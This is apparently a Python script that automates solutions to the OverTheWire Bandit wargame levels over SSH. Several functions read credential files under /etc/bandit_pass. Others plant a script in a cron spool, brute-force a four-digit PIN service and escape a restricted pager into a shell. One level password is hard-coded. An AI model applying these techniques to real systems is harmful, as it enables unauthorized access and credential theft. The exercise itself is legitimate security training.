

# Exploitation methods
def bandit0_1(client):

    next_user = "bandit1"

    stdin, stdout, stderr = client.exec_command("cat readme | tail -n 2 | awk 'NF{print $NF}'")

    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit1_2(client):

    next_user = "bandit2"

    stdin, stdout, stderr = client.exec_command("cat ./-")

    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit2_3(client):

    next_user = "bandit3"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat spaces\\ in\\ this\\ filename")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit3_4(client):

    next_user = "bandit4"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cd inhere/ && ls -A")
    file_name = stdout.read().decode().strip()
    stdin, stdout, stderr = client.exec_command("cat inhere/"+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit4_5(client):

    next_user = "bandit5"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("file inhere/* | grep ASCII | awk -F \":\" '{print $1}' | xargs echo | xargs cat")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit5_6(client):

    next_user = "bandit6"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("find . -type f -size 1033c ! -executable -exec file {} + | grep ASCII | xargs echo | awk -F \":\" '{print $1}'")
    file_name = stdout.read().decode().strip()

    stdin, stdout, stderr = client.exec_command("cat "+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit6_7(client):

    next_user = "bandit7"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("find / -user bandit7 -group bandit6 2>/dev/null")
    file_name = stdout.read().decode().strip()

    stdin, stdout, stderr = client.exec_command("cat "+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit7_8(client):

    next_user = "bandit8"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("grep -r \"millionth\" data.txt | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit8_9(client):

    next_user = "bandit9"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat data.txt | sort | uniq -u")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit9_10(client):

    next_user = "bandit10"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("strings data.txt | grep \"====\" | tail -n 1 | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit10_11(client):

    next_user = "bandit11"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat data.txt | base64 -d | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit11_12(client):

    next_user = "bandit12"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit12_13(client):

    next_user = "bandit13"

    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit12_13')
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    client.exec_command('cat ~/data.txt | xxd -r > '+temp_dir+'/data')
    
    sftp = client.open_sftp()
    sftp.get(temp_dir+'/data',os.path.join(subfolder_path,'data.gz'))
    
    file_name = decompressor.decompress_until_plain_text(os.path.join(subfolder_path,'data.gz'), os.path.join(subfolder_path,'temp_output'))
    file = open(file_name, "r")

    next_password = file.read().split()[-1]

    client.close()

    return next_user, next_password

def bandit13_14(client):

    next_user = "bandit14"
    
    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit13_14')

    sftp = client.open_sftp()
    sftp.get('/home/bandit13/sshkey.private',os.path.join(subfolder_path,'id_rsa'))

    # Process to obtain the ssh key file
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return next_user, next_password

def bandit14_15(client):

    next_user = "bandit15"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit14")
    current_password = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("echo " + current_password + " | nc localhost 30000 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit15_16(client):

    next_user = "bandit16"
    
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit15")
    current_password = stdout.read().decode().strip()

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("echo " + current_password + " | ncat --ssl localhost 30001 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit16_17(client):

    next_user = "bandit17"
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    utils_path = os.path.join(os.path.dirname(__file__),'utils')
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path,'portScan.sh'), temp_dir + '/portScan.sh')
        
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit16")
    current_password = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/portScan.sh")
    stdin, stdout, stderr = client.exec_command(temp_dir + "/portScan.sh > " + temp_dir + "/ports.txt")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    stdin, stdout, stderr = client.exec_command("for port in $(cat " + temp_dir + "/ports.txt); do (echo " + current_password + " | ncat --ssl localhost $port 2>/dev/null | sed -n '/-----BEGIN RSA PRIVATE KEY-----/,/-----END RSA PRIVATE KEY-----/p'); done > " + temp_dir + "/id_rsa")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    # id_rsa file retieve
    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit16_17')
    sftp = client.open_sftp()
    sftp.get(temp_dir+'/id_rsa',os.path.join(subfolder_path,'id_rsa'))
    
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return next_user, next_password

def bandit17_18(client):

    next_user = "bandit18"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("diff passwords.old passwords.new | tail -n 1 | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit18_19(client):

    next_user = "bandit19"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat readme")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit19_20(client):

    next_user = "bandit20"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("/home/bandit19/bandit20-do cat /etc/bandit_pass/bandit20")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit20_21(client):

    next_user = "bandit21"
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    utils_path = os.path.join(os.path.dirname(__file__),'utils')
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path,'bandit21_password.sh'), temp_dir + '/script.sh')
        
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit20")
    current_password = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/script.sh")
    
    stdin, stdout, stderr = client.exec_command(temp_dir + "/script.sh \"" + current_password + "\" \"" + temp_dir + "/log.txt\" \"" + temp_dir + "\"")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/log.txt")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit21_22(client):

    next_user = "bandit22"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat /usr/bin/cronjob_bandit22.sh | tail -n 1 | awk 'NF{print $NF}'")
    temp_folder = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_folder)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit22_23(client):

    next_user = "bandit23"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("echo I am user " + next_user + " | md5sum | cut -d ' ' -f 1")
    temp_file = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cat /tmp/" + temp_file)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit23_24(client):

    next_user = "bandit24"
    next_password = ""

    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("chmod o+wx " + temp_dir)
    
    stdin, stdout, stderr = client.exec_command("echo -e '#!/bin/bash\\n\\ncat /etc/bandit_pass/bandit24 > " + temp_dir + "/bandit24.password\\nchmod o+r " + temp_dir + "/bandit24.password' > " + temp_dir + "/script.sh")
    
    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/script.sh")
    
    stdin, stdout, stderr = client.exec_command("cp " + temp_dir + "/script.sh /var/spool/bandit24/foo/testing")
    
    stdin, stdout, stderr = client.exec_command("chmod +x /var/spool/bandit24/foo/testing")
        
    while not next_password:
        stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/bandit24.password 2>/dev/null | tr '\\n' ' '")
        next_password = stdout.read().decode("utf-8").strip()
        if len(stdout.read().decode("utf-8").strip()) != 0:
            break
    
    client.close()

    return next_user, next_password

def bandit24_25(client):

    next_user = "bandit25"
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit24")
    current_password = stdout.read().decode().strip()

    stdin, stdout, stderr = client.exec_command("for pin in {0000..9999}; do echo \"" + current_password + " $pin\"; done > " + temp_dir + "/combinations.txt")
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/combinations.txt | nc localhost 30002 | grep -vE 'Wrong|Please enter' | grep password | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit25_26(client):

    next_user = "bandit26"

    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit25_26')

    sftp = client.open_sftp()
    sftp.get('/home/bandit25/bandit26.sshkey',os.path.join(subfolder_path,'id_rsa'))

    # Process to obtain the ssh key file
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return next_user, next_password

def bandit26_27(client):

    next_user = "bandit27"
    
    client2 = ssh_connection("bandit25", "iCi86ttT4KSNe1armKiwbQNmB3YJP3q4")
    
    stdin, stdout, stderr = client2.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client2.exec_command("chmod o+wx " + temp_dir)
    
    # Abrir canal interactivo con un pseudo-terminal PEQUEÑO
    channel = client.invoke_shell(width=80, height=2)  # <--- ¡Truco aquí!
    time.sleep(1)

    # Escapar del more con !sh
    channel.send("v")
    channel.send("\n")
    time.sleep(2)
    channel.send(":set shell=/bin/bash")
    channel.send("\n")
    time.sleep(2)
    channel.send(":shell")
    channel.send("\n")
    time.sleep(2)

    channel.send("id")
    channel.send("\n")
    time.sleep(1)

    channel.send("whoami")
    channel.send("\n")
    time.sleep(1)
    
    # channel.send("cat /etc/bandit_pass/bandit26 > " + temp_dir + "/pass.txt \n")
    channel.send("./bandit27-do cat /etc/bandit_pass/bandit27 > " + temp_dir + "/pass.txt \n")
    time.sleep(1)

    # Leer todo el output que queda en el buffer
    output = ""
    start_time = time.time()
    while True:
        if channel.recv_ready():
            output += channel.recv(1024).decode(errors="ignore")
        if time.time() - start_time > 5:  # espera de 5 seg
            break
        time.sleep(0.2)

    # Cerrar sesión
    channel.send("exit\n")
    
    stdin, stdout, stderr = client2.exec_command("cat " + temp_dir + "/pass.txt")
    next_password = stdout.read().decode().strip()
    
    client.close()

    return next_user, next_password

def bandit27_28(client):

    next_user = "bandit28"
    repo_url = "ssh://bandit27-git@localhost:2220/home/bandit27-git/repo"
    
    temp_dir = make_temp_directory()
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/README | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()
        
    client.close()

    return next_user, next_password

def bandit28_29(client):

    next_user = "bandit29"
    repo_url = "ssh://bandit28-git@localhost:2220/home/bandit28-git/repo"
    
    temp_dir = make_temp_directory()
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git show $(git log | head -n 1 | awk 'NF{print $NF}') | grep \"\-\- password:\" | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit29_30(client):

    next_user = "bandit30"
    repo_url = "ssh://bandit29-git@localhost:2220/home/bandit29-git/repo"
    
    temp_dir = make_temp_directory()
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git checkout dev")
    
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && cat README.md | grep 'password' | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit30_31(client):

    next_user = "bandit31"
    repo_url = "ssh://bandit30-git@localhost:2220/home/bandit30-git/repo"
    
    temp_dir = make_temp_directory()
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git show secret")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit31_32(client):

    next_user = "bandit32"
    repo_url = "ssh://bandit31-git@localhost:2220/home/bandit31-git/repo"
    
    temp_dir = make_temp_directory(client)
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && cat README.md | grep 'Content' | awk -F ':' '{print $2}' | xargs")
    key_file_content = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && echo '" + key_file_content + "' > " + temp_dir + "/key.txt")
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git add -f key.txt")
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git commit -m \"Commit file key.txt\"")
    
    # Git push + ssh login
    channel = client.invoke_shell()
    time.sleep(1)

    channel.send("id\n")
    time.sleep(1)

    channel.send("whoami\n")
    time.sleep(1)
    
    channel.send("cd " + temp_dir + " && GIT_SSH_COMMAND=\"ssh -o StrictHostKeyChecking=no\" git push -u origin master\n")
    time.sleep(1)
    
    channel.send(current_password + "\n")
    time.sleep(1)

    # Read buffer output
    output = ""
    start_time = time.time()
    while True:
        if channel.recv_ready():
            output += channel.recv(1024).decode(errors="ignore")
        if time.time() - start_time > 5:  # espera de 5 seg
            break
        time.sleep(0.2)
    
    next_password = ""
    # Filter output to retrieve password for next level
    for i,line in enumerate(output.splitlines()):
        if "Well done!" in line:
            # Print next line and retrieve last string after split it by spaces
            next_password = output.splitlines()[i+1].split(" ", 1)[-1]
    
    # Close connection
    channel.send("exit\n")
    
    client.close()
    
    return next_user, next_password

def bandit32_33(client):

    next_user = "bandit33"
    
    temp_dir = make_temp_directory()
    # temp_dir = "/tmp/tmp.d1EBr5Tdm5"
    print("Temp dir: " + temp_dir)

    output = ""
    channel = client.invoke_shell()
    channel.send("$0\n")
    channel.send(f"cat /etc/bandit_pass/{next_user}\n")
    time.sleep(0.5)
    if channel.recv_ready():
        output = channel.recv(5000).decode()
    
    next_password = output.strip().splitlines()[-2]

    channel.close()
    client.close()
    return next_user, next_password

def bandit33_34(client):

    next_user = "bandit34"
    
    stdin, stdout, stderr = client.exec_command("whoami")
    next_password = stdout.read().decode().strip()
    
    client.close()
    return next_user, next_password

# Complete exploitation chain map
exploit_chain = {
    "bandit0": bandit0_1,
    "bandit1": bandit1_2,
    "bandit2": bandit2_3,
    "bandit3": bandit3_4,
    "bandit4": bandit4_5,
    "bandit5": bandit5_6,
    "bandit6": bandit6_7,
    "bandit7": bandit7_8,
    "bandit8": bandit8_9,
    "bandit9": bandit9_10,
    "bandit10": bandit10_11,
    "bandit11": bandit11_12,
    "bandit12": bandit12_13,
    "bandit13": bandit13_14,
    "bandit14": bandit14_15,
    "bandit15": bandit15_16,
    "bandit16": bandit16_17,
    "bandit17": bandit17_18,
    "bandit18": bandit18_19,
    "bandit19": bandit19_20,
    "bandit20": bandit20_21,
    "bandit21": bandit21_22,
    "bandit22": bandit22_23,
    "bandit23": bandit23_24,
    "bandit24": bandit24_25,
    "bandit25": bandit25_26,
    "bandit26": bandit26_27,
    "bandit27": bandit27_28,
    "bandit28": bandit28_29,
    "bandit29": bandit29_30,
    "bandit30": bandit30_31,
    "bandit31": bandit31_32,
    "bandit32": bandit32_33
}